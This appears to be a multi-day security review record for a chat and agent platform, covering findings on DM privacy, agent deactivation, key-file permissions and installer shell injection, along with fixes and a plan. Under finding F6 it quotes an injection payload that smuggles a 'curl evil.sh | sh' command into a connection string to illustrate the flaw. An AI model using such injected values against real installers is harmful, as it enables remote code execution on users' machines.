# Security & code review — findings and plan

**Started:** 2026-08-08
**Scope:** everything except the marketing site — `apps/web`, all `packages/*`,
`scripts/`, `supabase/migrations`, and the published npm package.
**Lenses:** security (primary), readability, efficiency.

This is a **multi-day review**. This document is the working record: what has
been checked, what was found, and what is left. Update it as passes complete —
the point is that a later pass does not redo settled ground.

---

## How to read this

Findings are graded by what an attacker can actually do, not by how alarming the
pattern looks. Two things are deliberately excluded:

- **The ~40 documented CodeQL dismissals.** Each has a written reason on the
  alert. They look unfixed and are settled. Do not reopen them.
- **Style.** Noted only where it obscures a security property.

---

## Pass 1 — 2026-08-08 (surface map, classic vulnerability classes)

### F1. Direct messages are not private — MEDIUM-HIGH — **FIXED**

> Closed by option 2 below. `#direct-messages` rows are now filtered to those
> the caller wrote or was mentioned in, on **every** read path that can surface
> message content — `getMessages`, `searchMessages`, the board preview, and
> note backlinks. Covered by `packages/shared/src/__tests__/direct-message-privacy.test.ts`.
> The original finding is kept below as the record of what was wrong.


**Confirmed empirically.** A connector token created seconds earlier, scoped
`read`, and belonging to a brand-new agent, read `#direct-messages` and returned
DMs between two other agents.

`getMessages(channelId, …)` filters on `channel_id` and `quarantined` and
nothing else. There is no membership check, by design — channels use naming
conventions rather than access control. But DMs live in a channel, so the design
decision silently extends to them.

**Why it matters more than it looks:** the name promises confidentiality that
does not exist. Anyone reasoning about this system — a person, or an agent
deciding what is safe to send — will assume a DM is between two parties. A
`read`-scoped connector token is meant to be a limited credential, and it can
read every private message on the instance.

**Options, in increasing cost:**
1. Rename the channel so the name stops implying privacy. Cheapest, honest,
   changes nothing structurally.
2. Special-case `#direct-messages` in `getMessages`: return only messages where
   the caller is author or mentioned. Small, targeted, preserves the model
   everywhere else.
3. A real per-channel membership model. Correct, and a much larger change than
   this finding justifies on its own.

**Recommendation: (2), plus (1) if the rename is cheap.** Decide before the
instance has more than one human on it — federation makes this worse, because a
gossip peer's agents are also agents.

### F2. `/api/slack/forward` loses messages on partial failure — MEDIUM — **FIXED**

> The cursor now advances only over messages a run actually finished with —
> forwarded or deliberately skipped — so a failure re-reads them instead of
> stepping over them. The query is capped at 100 per poll and the webhook has a
> 10s timeout. Covered by `apps/web/app/api/__tests__/slack-forward-cursor.test.ts`.
>
> **Still open:** the cursor remains in memory, so a cold start re-reads the
> last minute and may repeat a message. Making it durable needs somewhere to
> put it and there is no general state table — that is a schema decision, and
> duplicates are a much smaller problem than the loss that was there before.


Not an auth issue: the route correctly requires `Bearer $SLACK_FORWARD_SECRET`
and fails closed when unset. The problem is state handling.

```ts
let _lastPollTime: string | null = null;   // module scope
…
_lastPollTime = now;                        // set BEFORE the forward loop
for (const msg of messages) { … await fetch(webhookUrl, …) }
```

Three defects compounding:

- **The cursor advances before the work happens.** If the loop throws, or the
  process is recycled mid-loop, those messages are never retried and never
  forwarded. Silent, permanent loss.
- **Module-level state.** Per-instance and lost on cold start, so the cursor is
  not a reliable cursor at all. On a restart it silently re-reads the last 60
  seconds; behind more than one instance, each keeps its own.
- **No `limit()` on the query, no timeout on the Slack fetch.** An unbounded
  result set forwarded one-at-a-time, where a single hung webhook stalls
  everything behind it.

**Fix:** persist the cursor, advance it only after a message is successfully
forwarded (or record per-message state), bound the query, and give the fetch an
`AbortSignal.timeout`.

### F3. `agents` RLS is `USING (true)` — LOW, fragility not exposure

`agents_read_names` is the only permissive policy in 57. The table holds
`derived_key_hash` and `api_key_hash`.

**Not currently exploitable:** the anon role is refused at the GRANT layer
(`permission denied for table agents`), so the permissive policy never applies.
Verified with the live anon key.

**Why it is still worth recording:** the protection lives in a different
mechanism than the one a reader will check. Anyone auditing RLS sees
`USING (true)` on a table full of key hashes and concludes it is exposed — or
worse, a future change to the grants silently makes that true. Narrow the policy
to the columns it exists for, so the policy alone tells the truth.

---

## Pass 2 — 2026-08-09 (deep read: crypto, registration, tasks, connector scopes)

### F4. Deactivating an agent does not stop it — MEDIUM — **FIXED**

> Option 1. `registerAgent` now *matches* on `active` instead of setting it, so
> a deactivated agent stays deactivated and cannot install a fresh key either.
> Registration returns 403 with a plain explanation rather than a 200 followed
> by a 401. Covered by `packages/shared/src/__tests__/register-deactivated.test.ts`.
> Checked before shipping: 97 agents are inactive, all test residue, the most
> recent non-test one last seen 15 July — nothing live is stranded.

A deactivated agent reactivates itself on its very next request, with no
operator involvement.

```
prune/admin sets active = false
  → agent makes a request
  → findAgentByDerivedKeyHash filters active = true  → 401
  → the client re-registers  (as of #98 this actually happens)
  → registerAgent UPDATEs on name + machine ownership … and sets active: true
  → agent is back
```

`registerAgent`'s UPDATE has **no `active` filter**, so re-registration is also
un-deactivation. Nothing in the flow distinguishes "this agent is new to me"
from "an operator switched this agent off."

**Pass 1 recorded the opposite, and was wrong.** The "verified clean" table
below used to say deactivation *is* revocation. That was true only by accident:
`register()` short-circuited on its on-disk key cache and never contacted the
server, so the recovery path could not complete. Fixing that bug in #98 —
correctly, it broke recovery for every agent with an invalidated key — removed
the property. Worth stating plainly: a real fix silently cancelled a security
property nobody had written down as depending on it.

**Scope of the impact.** The actor needs the machine's Ed25519 private key, so
this is not remote — it is the machine itself. What it costs is an operator
control: there is currently no way to switch off an agent whose machine still
holds its key, and `scripts/prune-agents.ts` is ineffective against anything
still running. Three places document the opposite.

**Options:**
1. **Only set `active: true` on INSERT, not UPDATE.** One line. Deactivation
   becomes durable, key rotation still works (the UPDATE still writes
   `derived_key_hash`), and a disabled agent gets an honest, repeated 401
   instead of silently resurrecting. Re-enabling becomes a deliberate act —
   which is what the prune script already documents.
2. **Separate `revoked` from `active`.** `active` stays a soft liveness/listing
   flag that re-registration may clear; `revoked` is an operator kill switch
   checked by both auth and registration. Correct model, needs a migration.
3. Leave it and document that deactivation is cosmetic. **Reject** — a control
   that looks like a kill switch and is not is worse than no control.

**Recommendation: (1) now**, since it makes already-documented behaviour true
for one line, with (2) if an explicit revoke is wanted later.

### F5. The setup wizard writes the service-role key world-readable — MEDIUM — **FIXED**

> `0o600` plus an explicit `chmodSync`, matching the pattern used for the
> private key and `~/.airchat/config`. Ships in the npm package.

`writeWebEnv()` in `packages/create-airchat/src/index.ts` writes
`apps/web/.env.local` containing `SUPABASE_SERVICE_ROLE_KEY` and `DATABASE_URL`
(password included) with **no `mode`**, so it lands at the umask default —
normally `0644`. Any local user can read a key that bypasses every RLS policy.

The same file gets this right everywhere else: `~/.airchat/config` is written
`0o600`, the private key `0o600`, both directories `0o700`, each followed by an
explicit `chmodSync`. This one write was simply missed.

The explicit `chmod` matters as much as the mode: `writeFileSync`'s `mode`
applies only when **creating** a file, so re-running setup over an existing
`.env.local` would leave the old permissions in place regardless.

**Fix:** `{ mode: 0o600 }` plus a `chmodSync`, matching the pattern already used
five lines away. This ships in the npm package, so it needs a release.

### F6. Connection strings are interpolated into shell commands — MEDIUM — **FIXED**

> All four sites that interpolated user input (`supabase db push`, `psql`,
> `git clone`, and the two harness registration commands) now use
> `execFileSync` with an argument array, so no shell is involved. The two
> remaining `execSync` calls take fixed literals. Ships in the npm package.

```ts
execSync(`supabase db push --db-url "${config.supabaseUrl}"`, …)   // index.ts:352
execSync(`psql "${config.databaseUrl}" -f "${…}"`, …)              // index.ts:395
```

Both values come from setup prompts and are pasted into a shell string with
nothing but double quotes around them. A value containing `"` closes the quote
and everything after it runs:

```
https://x.supabase.co" ; curl evil.sh | sh ; echo "
```

The user is already running an installer with their own privileges, which caps
the severity — but *pasting a connection string someone gave you* is an
completely ordinary act, and that is the vector. A string from a tutorial, a
hosting provider's docs, a colleague, or a support reply becomes code
execution. The same shape appears in the harness registration commands
(`harnesses.ts:116,127`), where the interpolated paths derive from the
user-supplied install directory.

**Fix:** `execFileSync` with an argument array. It never invokes a shell, so
quoting stops being something anyone has to get right. `binaryExists()` takes
only fixed literals (`claude`, `codex`, …) and is fine either way.

### R1. The Supabase migration loop does nothing, slowly — readability

`index.ts:365-376` reads every migration file into memory, discards it, awaits
an RPC hard-coded to resolve `{ error: null }` from both handlers, increments a
counter, and then reports that the migrations still need applying by hand:

```ts
const sql = fs.readFileSync(…);              // never used
const { error } = await supabase.rpc('', {}) // both branches: { error: null }
  .then(() => ({ error: null }), () => ({ error: null }));
applied++;                                    // counts files NOT applied
```

`applied` counting files that were not applied is the part that will mislead
someone. The loop should list the files and say they need the SQL Editor, which
is what it already concludes — without the file reads or the round trip.

---

## Verified clean in pass 2

| Area | Result |
|---|---|
| `crypto.ts` | Ed25519 throughout. The signed message is a fixed-order JSON **array**, so there is no key-ordering ambiguity to exploit. 256-bit random derived keys, which is why plain SHA-256 storage is fine. `verifyRegistration` is wrapped at the call site, so a malformed key cannot 500. |
| Registration flow | IP (10/min) and per-machine (5/min) rate limits, ±60s timestamp window, nonce replay check, per-machine agent cap. Machine-not-found and bad-signature return an **identical** 403, so the endpoint does not confirm which machines exist. |
| Task authorization | `completeTask` requires `claimed_by = caller`; `cancelTask` requires `created_by = caller`; `claimTask` is a conditional UPDATE guarded on `status = 'open'`, so a race has exactly one winner. All three are conditional UPDATEs — no SELECT-then-UPDATE window. |
| Connector token scopes | Enforced by construction: the per-request server is built with only the tools the scope allows, so a read token has no write tool to call. Tested against **every** write tool by name, an unrecognised scope degrades to read-only, and the two sets are asserted disjoint. |

**Nonce replay, assessed and not a finding.** The nonce store is in-memory, so a
restart or a second instance would not catch a replay. It does not matter: the
signature covers `derived_key_hash`, so a replay can only re-assert the key
already on the row. It cannot introduce one. (Reactivation is the exception,
and that is F4 — reachable without a replay anyway.)

---

## Verified clean in pass 1

Recorded so later passes skip them. Each was checked, not assumed.

| Area | Result |
|---|---|
| SSRF | No bare `fetch` on any peer- or user-controlled URL. The `fetchPeerUrl` discipline is holding across the codebase. |
| XSS | No `dangerouslySetInnerHTML` anywhere. |
| SQL injection | No raw SQL, no string-interpolated queries, no `.rpc()` with user input. |
| Path traversal | `validateStoragePath` rejects `..`, absolute paths and null bytes; uploads additionally blocked by a dangerous-MIME list (`text/html`, `image/svg+xml`, …) so a stored file cannot execute same-origin. |
| Agent auth | `findAgentByDerivedKeyHash` filters `active = true`, so a deactivated agent's key is refused on both the v2 and connector paths. ⚠️ **This row previously claimed deactivation is revocation. It is not — see F4.** The key is refused, and then re-registration turns the agent back on. |
| RLS coverage | 21/21 tables. |
| Federation | Envelope signatures mandatory, quarantine on failure, peer auto-suspend past a threshold, channel-namespace enforcement on inbound. |

---

## Not yet reviewed

Honest list of what pass 1 did **not** cover. ~25,000 lines were in scope; this
pass mapped the surface and swept for known-shape vulnerabilities.

| Area | Lines | Why it matters |
|---|---|---|
| `packages/shared/src` | ~5,200 | The storage adapter, crypto, gossip envelopes. Highest-value deep read remaining — every route depends on it. |
| `apps/web/app/api/v2/*` | ~4,000 | Route-by-route input validation and IDOR. Only spot-checked. |
| `apps/web/app/dashboard` | ~3,850 | Client-side. Lower risk (admin-only, no `dangerouslySetInnerHTML`) but unreviewed. |
| `supabase/migrations` | ~2,400 | 57 policies read only in aggregate. Each should be read against its table's threat model. |
| `scripts/` | ~2,000 | All run with the service role. A bug here is unbounded. |
| `create-airchat` | ~1,130 | **Runs on other people's machines** and writes their config. Deserves its own pass. |
| `slack-bridge` | ~505 | Handles an external webhook. |

---

## Plan

### Phase 1 — close pass-1 findings
1. ~~**F1** — decide the DM privacy model.~~ **Done** — option 2, applied to all
   four read paths.
2. ~~**F2** — make the Slack cursor durable and bounded.~~ **Done** for the loss
   and the bounds; durability of the cursor deferred, see the finding.
3. **F3** — narrow the `agents` policy so it states its own intent.

### Phase 2 — deep reads, highest exposure first
4. ~~`packages/shared/src` — storage adapter and crypto.~~ **Started.** Crypto,
   registration, task authorization and connector scopes read and clear; F4
   found. The gossip adapter and the rest of the storage adapter remain.
5. ~~`create-airchat` — it runs on machines that are not ours.~~ **Done** —
   F5, F6, R1.
6. Route-by-route pass over `/api/v2` for IDOR and input validation. *Not
   started.*
7. Migrations, policy by policy. *Not started.*

### Decisions waiting on Duncan
- **F4** — pick option 1 or 2. Until then there is no way to switch an agent
  off.
- **F3** — narrowing the `agents` policy needs a migration.
- **F5/F6** — both are in the published npm package, so fixing them means
  cutting a release.

### Phase 3 — readability and efficiency
Deliberately last: a refactor before the security picture is settled makes
findings harder to attribute.

8. **Document the auth model in one place.** Building the route→auth map for
   this review required reading 44 files, and my first attempt got two routes
   wrong. If a reviewer cannot answer "what protects this endpoint?" without
   grepping, neither can the person adding endpoint 45.
9. **The React Compiler backlog** — 10 `set-state-in-effect`, tracked in
   Fishladder `ab5de474`. One pattern repeated: resetting state in an effect on
   `view` change.
10. **Bound the unbounded.** `slack/forward` is the known case; audit other
    queries for a missing `limit()`.

### Phase 4 — adversarial pass
Only once the above is clean. Per the review-process convention, a red-team
perspective looking for kill chains rather than isolated defects: chaining the
open-registration endpoint, the shared-channel read model, and federation.

---

## Process notes

- **Grep is for finding candidates, not for clearing areas.** The route→auth map
  in this pass had two false positives (`/api/mcp`, `/api/slack/forward`) because
  the auth call moved to another file. Both were only settled by reading.
- **Prefer proving a finding.** F1 is stated with confidence because a throwaway
  token actually returned other agents' DMs. F3 is graded down because the
  attempt was refused. The difference is worth the few minutes.
- Clean up probes. The F1 test agent and token were removed after use.
